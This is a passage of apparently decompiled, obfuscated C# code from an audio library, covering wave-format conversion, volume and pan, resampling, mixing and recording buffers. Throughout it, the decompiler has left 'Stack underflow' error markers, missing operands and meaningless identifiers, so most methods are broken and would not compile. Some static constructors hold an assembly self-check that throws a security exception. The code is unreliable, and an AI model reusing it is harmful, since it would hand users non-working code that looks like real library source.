				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public _000E(global::_0006._0006 _0010_0090_0006)
		{
			if (_0010_0090_0006.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(_0080._0014._0001(107386247));
			}
			if (_0010_0090_0006.WaveFormat._0003 != 32)
			{
				throw new ArgumentException(_0080._0014._0001(107386247));
			}
			this._0001 = new global::_0005._0005(_0010_0090_0006.WaveFormat._0001, 16, _0010_0090_0006.WaveFormat._0001);
			this._0001 = 1f;
			this._0001 = _0010_0090_0006;
			this._0001 = _0010_0090_0006.Length / 2;
			this.m__0002 = _0010_0090_0006.Position / 2;
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0079: Incompatible stack heights: 0 vs 1
			//IL_0085: Incompatible stack heights: 0 vs 2
			object obj = ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				int num = _0004 * 2;
				_0001 = global::_0011._0018._0001(num, _0001);
				int num2 = _0082._007E_0006_0004(this._0001, _0001, 0, num);
				global::_0011._0018._0001(num2, _0003, this, _0002, _0001);
				this.m__0002 += num2 / 2;
				return num2 / 2;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		protected override void _0002(bool _0002)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_000E)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_ = global::_0008._007E_0004_0002;
				global::_0006._0006 obj = ((_000E)/*Error near IL_0019: Stack underflow*/)._0001;
				/*Error near IL_001e: Stack underflow*/(obj);
				this._0001 = null;
			}
			global::_0005._008A(this, _0002);
		}
	}
}
namespace _0007
{
	internal sealed class _0006 : global::_0006._0006, global::_0001._0007
	{
		private new global::_0006._0006 m__0001;

		private new readonly global::_0005._0005 m__0001;

		private new readonly long m__0001;

		internal new readonly int _0001;

		internal readonly int _0002;

		private new volatile float m__0001;

		private volatile float m__0002;

		private long m__0002;

		private new readonly global::_0003._0005 m__0001;

		private new readonly object m__0001 = new object();

		[CompilerGenerated]
		private new bool m__0001;

		[CompilerGenerated]
		internal new EventHandler<global::_0016._0008> _0001;

		internal new global::_0016._0008 _0001 = new global::_0016._0008(0f, 0f);

		public override int BlockAlign
		{
			get
			{
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_001e: Incompatible stack heights: 0 vs 1
				_ = ((_0006)/*Error near IL_0009: Stack underflow*/).m__0001.BlockAlign;
				long num = (long)/*Error near IL_000c: Stack underflow*/;
				return (int)global::_0011._0018._0001((_0006)/*Error near IL_0011: Stack underflow*/, num);
			}
		}

		public override long Length => ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_0087: Incompatible stack heights: 0 vs 1
				//IL_0093: Incompatible stack heights: 0 vs 2
				object obj = ((_0006)/*Error near IL_000a: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
				try
				{
					value -= value % BlockAlign;
					if (value < 0)
					{
						_007F_0002._007E_0083_0005(this.m__0001, 0L);
					}
					else
					{
						_007F_0002._007E_0083_0005(this.m__0001, global::_0011._0018._0001(value, this));
					}
					this.m__0002 = global::_0011._0018._0001(this, global::_0012._007E_0091_0002(this.m__0001));
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public bool PadWithZeroes
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public override global::_0005._0005 WaveFormat => ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;

		public float Volume
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0009: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_000b: Stack underflow*/).m__0001 = (float)/*Error near IL_000b: Stack underflow*/;
			}
		}

		public float Pan
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0009: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_000b: Stack underflow*/).m__0002 = (float)/*Error near IL_000b: Stack underflow*/;
			}
		}

		public event EventHandler<global::_0016._0008> Sample
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0016._0008> eventHandler = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0016._0008> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0016._0008>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0016._0008> value2 = (EventHandler<global::_0016._0008>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0016._0008> eventHandler = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0016._0008> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0016._0008>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0016._0008> value2 = (EventHandler<global::_0016._0008>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0006(global::_0006._0006 _0010_0090_0006, float _001E_0090_0006, float _001F_0090_0006)
		{
			PadWithZeroes = true;
			global::_0003._0005[] array = new global::_0003._0005[8]
			{
				new global::_001F._0007(),
				new global::_0010._0007(),
				new global::_0016._0010(),
				new global::_0019._0008(),
				new global::_0006._0008(),
				new global::_0012._0006(),
				new global::_0008._0007(),
				new global::_0011._0007()
			};
			foreach (global::_0003._0005 obj in array)
			{
				if (obj._0001(_0010_0090_0006.WaveFormat))
				{
					this.m__0001 = obj;
					break;
				}
			}
			if (this.m__0001 == null)
			{
				throw new ArgumentException(_0080._0014._0001(107386230));
			}
			this.m__0001 = global::_0011._0018._0001(_0010_0090_0006.WaveFormat._0001, 2);
			this._0001 = 8;
			this.m__0001 = _0010_0090_0006;
			this.m__0001 = _001E_0090_0006;
			this.m__0002 = _001F_0090_0006;
			this._0002 = _0010_0090_0006.WaveFormat._0001 * _0010_0090_0006.WaveFormat._0003 / 8;
			this.m__0001 = global::_0011._0018._0001(this, _0010_0090_0006.Length);
			this.m__0002 = 0L;
		}

		public _0006(global::_0006._0006 _0010_0090_0006)
			: this(_0010_0090_0006, 1f, 0f)
		{
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0188: Incompatible stack heights: 0 vs 1
			//IL_0194: Incompatible stack heights: 0 vs 2
			object obj = ((_0006)/*Error near IL_000a: Stack underflow*/).m__0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				int num = 0;
				_0080._0004 obj2 = new _0080._0004(_0002);
				if (this.m__0002 < 0)
				{
					num = (int)_0008_0003._0087_0006(_0004, -this.m__0002);
					for (int i = 0; i < num; i++)
					{
						_0002[i + _0003] = 0;
					}
				}
				if (num < _0004)
				{
					this.m__0001._0001(this.m__0001, (_0004 - num) / 8);
					int num2 = _0003 / 4 + num / 4;
					float num3;
					float num4;
					while (this.m__0001._0001(out num3, out num4) && num < _0004)
					{
						num3 = ((this.m__0002 <= 0f) ? num3 : (num3 * (1f - this.m__0002) / 2f));
						num4 = ((this.m__0002 >= 0f) ? num4 : (num4 * (this.m__0002 + 1f) / 2f));
						num3 *= this.m__0001;
						num4 *= this.m__0001;
						obj2.FloatBuffer[num2++] = num3;
						obj2.FloatBuffer[num2++] = num4;
						num += 8;
						if (this._0001 != null)
						{
							global::_0011._0018._0001(num3, this, num4);
						}
					}
				}
				if (PadWithZeroes && num < _0004)
				{
					_0007_0003._0086_0006(_0002, _0003 + num, _0004 - num);
					num = _0004;
				}
				this.m__0002 += num;
				return num;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		public override bool _0001(int _0002)
		{
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 2
			//IL_004c: Incompatible stack heights: 0 vs 1
			_ = ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0006._0006)/*Error near IL_004c: Stack underflow*/)._0001((int)/*Error near IL_004c: Stack underflow*/);
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				if (this.m__0002 + _0002 < 0)
				{
					return false;
				}
				if (this.m__0002 < this.m__0001)
				{
					return this.m__0001 != 0f;
				}
				return false;
			}
			return false;
		}

		protected override void _0002(bool _0002)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0006)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_0004_0002;
				global::_0006._0006 obj = ((_0006)/*Error near IL_0019: Stack underflow*/).m__0001;
				/*Error near IL_001e: Stack underflow*/(obj);
				this.m__0001 = null;
			}
			global::_0005._008A(this, _0002);
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0011
{
	internal sealed class _0004 : IDisposable, _001C._0004
	{
		internal readonly global::_0006._0010 _0001;

		private readonly _001C._0004 m__0001;

		private readonly global::_0005._0005 m__0001;

		private readonly int m__0001;

		internal int _0002;

		internal int _0003;

		internal int _0004;

		private bool m__0001;

		public global::_0005._0005 WaveFormat => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0004(global::_0005._0005 _0081_0090_0006, _001C._0004 _0002_0090_0006)
		{
			this.m__0001 = _0002_0090_0006;
			this.m__0001 = _0081_0090_0006;
			this._0001 = new global::_0006._0010(_0002_0090_0006.WaveFormat, _0081_0090_0006);
			this.m__0001 = Math.Min(_0002_0090_0006.WaveFormat._0002, this._0001.SourceBuffer.Length);
			this.m__0001 -= this.m__0001 % _0002_0090_0006.WaveFormat.BlockAlign;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_019c: Incompatible stack heights: 0 vs 1
			//IL_01a2: Incompatible stack heights: 0 vs 1
			int i = 0;
			int num = ((_0004)/*Error near IL_0015: Stack underflow*/).WaveFormat.BlockAlign;
			if (/*Error near IL_001b: Stack underflow*/ % num != 0)
			{
				_0004 -= _0004 % WaveFormat.BlockAlign;
			}
			int num4 = default(int);
			int num7;
			for (; i < _0004; i += num7)
			{
				int num2 = _0016_0002._0018_0005(_0004 - i, this._0002);
				if (num2 > 0)
				{
					_0099_0002._0010_0006(this._0001.DestBuffer, this._0003, _0002, _0003 + i, num2);
					this._0003 += num2;
					this._0002 -= num2;
					i += num2;
				}
				if (i >= _0004)
				{
					break;
				}
				int count = _0016_0002._0018_0005(this.m__0001, this._0001.SourceBuffer.Length - this._0004);
				int num3 = this.m__0001.Read(this._0001.SourceBuffer, this._0004, count) + this._0004;
				if (num3 == 0)
				{
					break;
				}
				int num5 = _0018._0001(ref num4, this._0001, num3);
				if (num4 == 0)
				{
					break;
				}
				this._0004 = num3 - num4;
				if (this._0004 > 0)
				{
					_0099_0002._0011_0006(this._0001.SourceBuffer, num4, this._0001.SourceBuffer, 0, this._0004);
				}
				if (num5 <= 0)
				{
					break;
				}
				int num6 = _0004 - i;
				num7 = _0016_0002._0018_0005(num5, num6);
				if (num7 < num5)
				{
					this._0002 = num5 - num7;
					this._0003 = num7;
				}
				_0099_0002._0010_0006(this._0001.DestBuffer, 0, _0002, i + _0003, num7);
			}
			return i;
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			if (!((_0004)/*Error near IL_0007: Stack underflow*/).m__0001)
			{
				((_0004)/*Error near IL_0011: Stack underflow*/).m__0001 = true;
				((_0004)/*Error near IL_0018: Stack underflow*/)._0001._0001();
			}
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _0091_0002._009B_0005;
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/);
			((_0004)/*Error near IL_0011: Stack underflow*/)._0001(_0002: true);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0004)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0004()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (_0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000F
{
	internal sealed class _0005 : global::_0006._0006
	{
		private new readonly global::_0011._0004 m__0001;

		internal new readonly global::_0005._0005 _0001;

		private new readonly long m__0001;

		private long m__0002;

		internal new readonly global::_0006._0006 _0001;

		private new bool m__0001;

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_000c: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				//IL_0010: Expected I8, but got Unknown
				//IL_0052: Incompatible stack heights: 0 vs 1
				//IL_0055: Incompatible stack heights: 0 vs 1
				//IL_0058: Incompatible stack heights: 0 vs 1
				int num = ((global::_0006._0006)/*Error near IL_000b: Stack underflow*/).BlockAlign;
				_003F val = /*Error near IL_000d: Stack underflow*/% num;
				value = /*Error near IL_000e: Stack underflow*/- val;
				long num2 = global::_0011._0018._0001(this, value);
				_007F_0002._007E_0083_0005(this._0001, num2);
				this.m__0002 = global::_0011._0018._0001(global::_0012._007E_0091_0002(this._0001), this);
				global::_0011._0018._0001(this.m__0001);
			}
		}

		public override long Length => ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;

		public override global::_0005._0005 WaveFormat => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0005(global::_0005._0005 _0081_0090_0006, global::_0006._0006 _0010_0090_0006)
		{
			this._0001 = _0010_0090_0006;
			this._0001 = _0081_0090_0006;
			this.m__0001 = new global::_0011._0004(_0081_0090_0006, _0010_0090_0006);
			this.m__0001 = global::_0011._0018._0001((long)(int)_0010_0090_0006.Length, this);
			this.m__0002 = 0L;
		}

		[Obsolete("can be unreliable, use of this method not encouraged")]
		public new int _0001(int _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 2
			//IL_0014: Incompatible stack heights: 0 vs 1
			_ = (long)/*Error near IL_0003: Stack underflow*/;
			global::_0011._0018._0001((long)/*Error near IL_0014: Stack underflow*/, (_0005)/*Error near IL_0014: Stack underflow*/);
			return (int)/*Error near IL_0008: Stack underflow*/;
		}

		[Obsolete("can be unreliable, use of this method not encouraged")]
		public int _0002(int _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			long num = (long)/*Error near IL_0005: Stack underflow*/;
			global::_0011._0018._0001((_0005)/*Error near IL_0014: Stack underflow*/, num);
			return (int)/*Error near IL_0008: Stack underflow*/;
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002a: Incompatible stack heights: 0 vs 1
			_ = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((global::_0011._0004)/*Error near IL_0011: Stack underflow*/).Read((byte[])/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/, _0004);
			this.m__0002 += num;
			return num;
		}

		protected override void _0001(bool _0002)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			if (!((_0005)/*Error near IL_0007: Stack underflow*/).m__0001)
			{
				((_0005)/*Error near IL_0011: Stack underflow*/).m__0001 = true;
				if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
				{
					global::_0008._007E_0004_0002(this._0001);
					this.m__0001._0001();
				}
			}
			global::_0005._008A(this, _0002);
		}
	}
}
namespace _0011
{
	internal sealed class _0005 : IDisposable
	{
		internal readonly _007F._0006 _0001;

		private readonly int m__0001;

		internal readonly byte[] _0001;

		internal GCHandle _0001;

		internal IntPtr _0001;

		internal GCHandle _0002;

		internal GCHandle _0003;

		public byte[] Data => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;

		public bool Done => (((_0005)/*Error near IL_0007: Stack underflow*/)._0001._0001 & global::_000E._0004._0002) == global::_000E._0004._0002;

		public bool InQueue => (((_0005)/*Error near IL_0007: Stack underflow*/)._0001._0001 & global::_000E._0004._0004) == global::_000E._0004._0004;

		public int BytesRecorded => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001._0002;

		public int BufferSize => ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0005(IntPtr _0082_0090_0006, int _0086_0080)
		{
			this.m__0001 = _0086_0080;
			this._0001 = new byte[_0086_0080];
			this._0001 = GCHandle.Alloc(this._0001, GCHandleType.Pinned);
			this._0001 = _0082_0090_0006;
			this._0001 = new _007F._0006();
			this._0002 = GCHandle.Alloc(this._0001, GCHandleType.Pinned);
			this._0001._0001 = this._0001.AddrOfPinnedObject();
			this._0001._0001 = _0086_0080;
			this._0001._0003 = 1;
			_0003 = GCHandle.Alloc(this);
			this._0001._0002 = (IntPtr)_0003;
			_0018._0001(_0018._0001(_0082_0090_0006, this._0001, Marshal.SizeOf((object)this._0001)), _0080._0014._0001(107386153));
		}

		protected override void _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 2
			try
			{
				_ = 0;
				_0018._0001((byte)/*Error near IL_000f: Stack underflow*/ != 0, (_0005)/*Error near IL_000f: Stack underflow*/);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		public void _0002()
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009B_0005;
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/);
			_ = 1;
			_0018._0001((byte)/*Error near IL_0011: Stack underflow*/ != 0, (_0005)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002();
		}

		static _0005()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (_0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001B
{
	internal sealed class _000F : global::_0006._0006
	{
		internal new readonly List<global::_0006._0006> _0001;

		internal new readonly object _0001;

		internal new global::_0005._0005 _0001;

		internal new long _0001;

		private long m__0002;

		private new readonly int m__0001;

		[CompilerGenerated]
		private new bool m__0001;

		public int InputCount
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000F)/*Error near IL_0007: Stack underflow*/)._0001.Count;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public bool AutoStop
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000F)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public override int BlockAlign
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000F)/*Error near IL_0007: Stack underflow*/)._0001.BlockAlign;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override long Length => ((_000F)/*Error near IL_0007: Stack underflow*/)._0001;

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_009d: Incompatible stack heights: 0 vs 1
				//IL_00a9: Incompatible stack heights: 0 vs 2
				object obj = ((_000F)/*Error near IL_000a: Stack underflow*/)._0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
				try
				{
					value = _0008_0003._0087_0006(value, global::_0012._007E_0090_0002(this));
					foreach (global::_0006._0006 item in this._0001)
					{
						_007F_0002._007E_0083_0005(item, _0008_0003._0087_0006(value, global::_0012._007E_0090_0002(item)));
					}
					this.m__0002 = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public override global::_0005._0005 WaveFormat => ((_000F)/*Error near IL_0007: Stack underflow*/)._0001;

		public _000F()
		{
			AutoStop = true;
			this._0001 = global::_0011._0018._0001(44100, 2);
			this.m__0001 = 4;
			this._0001 = new List<global::_0006._0006>();
			this._0001 = new object();
		}

		public _000F(IEnumerable<global::_0006._0006> _0083_0090_0006, bool _0084_0090_0006)
			: this()
		{
			AutoStop = _0084_0090_0006;
			foreach (global::_0006._0006 item in _0083_0090_0006)
			{
				global::_0011._0018._0001(this, item);
			}
		}

		public void _0001(global::_0006._0006 _0002)
		{
			//IL_008c: Incompatible stack heights: 0 vs 1
			//IL_0098: Incompatible stack heights: 0 vs 2
			object obj = ((_000F)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				if (!this._0001.Remove(_0002))
				{
					return;
				}
				long num = 0L;
				foreach (global::_0006._0006 item in this._0001)
				{
					num = _0008_0003._0088_0006(num, global::_0012._007E_0090_0002(item));
				}
				this._0001 = num;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0127: Incompatible stack heights: 0 vs 1
			//IL_0131: Incompatible stack heights: 0 vs 1
			//IL_0137: Incompatible stack heights: 0 vs 1
			_ = ((_000F)/*Error near IL_0131: Stack underflow*/).AutoStop;
			if ((int)/*Error near IL_000c: Stack underflow*/ != 0 && ((_000F)/*Error near IL_0016: Stack underflow*/).m__0002 + _0004 > this._0001)
			{
				_0004 = (int)(this._0001 - this.m__0002);
			}
			if (_0004 % this.m__0001 != 0)
			{
				throw new ArgumentException(_0080._0014._0001(107387692), _0080._0014._0001(107388337));
			}
			_0007_0003._0086_0006(_0002, _0003, _0004);
			int num = 0;
			byte[] array = new byte[_0004];
			object obj = this._0001;
			_0091_0002._009C_0005(obj);
			try
			{
				foreach (global::_0006._0006 item in this._0001)
				{
					if (item._0001(_0004))
					{
						int num2 = _0082._007E_0006_0004(item, array, 0, _0004);
						num = _0016_0002._0019_0005(num, num2);
						if (num2 > 0)
						{
							global::_0011._0018._0001(array, num2, _0002, _0003);
						}
					}
					else
					{
						num = _0016_0002._0019_0005(num, _0004);
						_007F_0002._007E_0083_0005(item, item.Position + _0004);
					}
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			this.m__0002 += _0004;
			return _0004;
		}

		protected override void _0002(bool _0002)
		{
			//IL_006a: Incompatible stack heights: 0 vs 1
			//IL_006d: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				object obj = ((_000F)/*Error near IL_000b: Stack underflow*/)._0001;
				_0091_0002._009C_0005(obj);
				try
				{
					using List<global::_0006._0006>.Enumerator enumerator = this._0001.GetEnumerator();
					while (enumerator.MoveNext())
					{
						global::_0008._007E_0004_0002(enumerator.Current);
					}
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
			global::_0005._008A(this, _0002);
		}
	}
}
namespace _0016
{
	internal sealed class _000E : global::_0006._0006
	{
		private new global::_0006._0006 m__0001;

		private new long m__0001;

		private long _0002;

		private long _0003;

		private long _0004;

		private new readonly int m__0001;

		private long _0005;

		private new TimeSpan m__0001;

		private TimeSpan _0002;

		private TimeSpan _0003;

		private new readonly object m__0001 = new object();

		public TimeSpan StartTime
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0081: Incompatible stack heights: 0 vs 1
				//IL_008d: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
				try
				{
					this.m__0001 = value;
					this.m__0001 = (long)(this.m__0001.TotalSeconds * (double)this.m__0001.WaveFormat._0001) * this.m__0001;
					_0004 = this.m__0001 + this._0003;
					_007F_0002._007E_0083_0005(this, global::_0012._007E_0091_0002(this));
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public TimeSpan SourceOffset
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_0070: Incompatible stack heights: 0 vs 1
				//IL_0076: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				object obj2 = default(object);
				if (0 == 0)
				{
					obj2 = obj;
				}
				_ = _0091_0002._009C_0005;
				/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
				try
				{
					_0002 = value;
					this._0002 = (long)(_0002.TotalSeconds * (double)this.m__0001.WaveFormat._0001) * this.m__0001;
					_007F_0002._007E_0083_0005(this, global::_0012._007E_0091_0002(this));
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
		}

		public TimeSpan SourceLength
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			set
			{
				//IL_0081: Incompatible stack heights: 0 vs 1
